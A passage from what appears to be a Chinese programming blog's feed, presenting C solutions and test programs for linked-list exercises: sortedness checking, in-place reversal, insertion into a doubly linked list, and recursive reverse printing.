*head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的!\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *pt;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//pt = creat_first();</span></span><br><span class="line"><span class="keyword">while</span>(i &lt;=<span class="number">3</span>)&#123;</span><br><span class="line">pt = creat_behind();</span><br><span class="line">print(pt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;a&#x27;</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 升序 排列的！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;b&#x27;</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 降序 排列的！\n&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 无序 排列的！\n\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/fr4LIcPyRCUT9a6.png" alt="image-20211003213242240"></p><h3 id="4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"><a href="#4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。" class="headerlink" title="4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"></a>4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建 带头结点的 单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head,*s,*r;</span><br><span class="line">datatype x;</span><br><span class="line">    head = r = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入单链表内容：（以 0 结尾）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出 带头结点的单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原单链表：\n&quot;</span>);</span><br><span class="line">    print(pt); </span><br><span class="line">    reverse(pt); <span class="comment">//转置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转置之后的单链表：\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/7FEl8ghiqaZ2rS5.png" alt="image-20211005190811303"></p><h3 id="5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#5-设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>5. 设计一个算法，在双链表中值为y的结点前面插入一个值为x的新结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">p = head-&gt;rlink;  <span class="comment">//由于是带头结点的 所以 指向 head 的 下一个位置</span></span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt,*pt1;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt1 = insert(pt,<span class="number">10</span>,<span class="number">99</span>); <span class="comment">//在 10 前面插入 99</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之后：\n&quot;</span>);</span><br><span class="line">    print(pt1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/Cf2WKS5phxjXoIi.png" alt="image-20211005184052812"></p><h3 id="6-设计一个算法，从右向左打印一个双链表中各个结点的值。"><a href="#6-设计一个算法，从右向左打印一个双链表中各个结点的值。" class="headerlink" title="6. 设计一个算法，从右向左打印一个双链表中各个结点的值。"></a>6. 设计一个算法，从右向左打印一个双链表中各个结点的值。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法  创建 带头结点的 双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s;</span><br><span class="line">datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入双链表的内容：（以 0 结束）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink;</span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">    p = head-&gt;rlink;</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表的各个值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之后：\n&quot;</span>);</span><br><span class="line">print_reverse(pt);</span><br><span class="line">    <span class="comment">//print(pt);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/iMBrSeKhj7Z819k.png" alt="image-20211005185759360"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;第三章-链式存储&quot;&gt;&lt;a href=&quot;#第三章-链式存储&quot; class=&quot;headerlink&quot; title=&quot;第三章  链式存储&quot;&gt;&lt;/a&gt;第三章  链式存储&lt;/h2&gt;&lt;h3 id=&quot;1-设计一个算法，求一个单链表中的结点个数。&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="链式存储" scheme="https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>线性表的链式存储</title>
    <link href="https://xizhi-future.github.io/2021/10/05/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"/>
    <id>https://xizhi-future.github.io/2021/10/05/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/</id>
    <published>2021-10-05T11:49:33.000Z</published>
    <updated>2021-10-07T09:32:38.385Z</updated>
    
